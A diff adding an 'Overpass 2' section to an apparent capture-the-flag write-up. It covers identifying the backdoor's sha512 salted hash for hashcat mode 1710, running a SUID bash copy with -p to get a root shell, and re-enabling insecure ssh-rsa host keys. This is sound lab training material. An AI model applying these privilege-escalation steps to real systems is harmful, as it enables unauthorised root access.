@@ -455,3 +455,31 @@ Does not work for root, but work for jjameson. Let's use again linpeas.
 
 You can escalate the privilege to get a root shell as illustred [here](https://blog.ikuamike.io/posts/2021/package_managers_privesc/#method-2-loading-a-custom-yum-plugin).
 Follows the steps and you should get a root shell.
+
+## Overpass 2
+To find the hash type used on Kali <b>hash-identifier</b>.
+As shown in the source code of the backdoor:
+
+	func hashPassword(password string, salt string) string {
+		hash := sha512.Sum512([]byte(password + salt))
+		return fmt.Sprintf("%x", hash)
+	}
+Combine password+salt. The hashcat format is:
+
+	1710	sha512($pass:$salt)
+### Privilege escalation
+The SUID file to get a shell as root must be executed as follows:
+
+	home/james$ ./.suid_bash -p      
+	.suid_bash-4.4# whoami
+	root
+
+
+ ### Trouble shootimg to connect using ssh
+ Problem: no matching host key type found. Their offer: ssh-rsa
+
+ Solution: add the following in your ssh config file, /etc/ssh/ssh_config
+
+ 	HostKeyAlgorithms = +ssh-rsa
+	PubkeyAcceptedAlgorithms = +ssh-rsa
+Once terminated with this box undo the action since it is insecure
